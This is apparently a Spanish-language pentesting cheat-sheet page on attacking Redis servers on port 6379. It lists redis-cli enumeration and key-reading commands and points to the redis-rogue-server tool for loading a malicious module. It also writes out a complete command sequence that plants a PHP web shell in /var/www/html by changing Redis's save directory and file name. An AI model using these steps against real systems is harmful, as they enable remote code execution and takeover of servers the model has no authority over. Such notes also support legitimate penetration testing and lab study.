---
title: "Redis (6379)"
layout: "single"
category: "Servicios"
slug: "servicios/redis"
date: "2025-11-26"
---

### Enumeración
```bash
redis-cli -h <IP>
# Si pide pass: redis-cli -h <IP> -a <pass>
```

### Comandos
```bash
INFO keyspace      # Ver DBs
SELECT 0           # Usar DB
KEYS * # Listar
GET <key>          # Leer
```

### RCE (Redis Rogue)
Usa [Redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) para subir módulo malicioso.

### RCE (Webshell)
Si corre como root y sabes ruta web:
```bash
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```
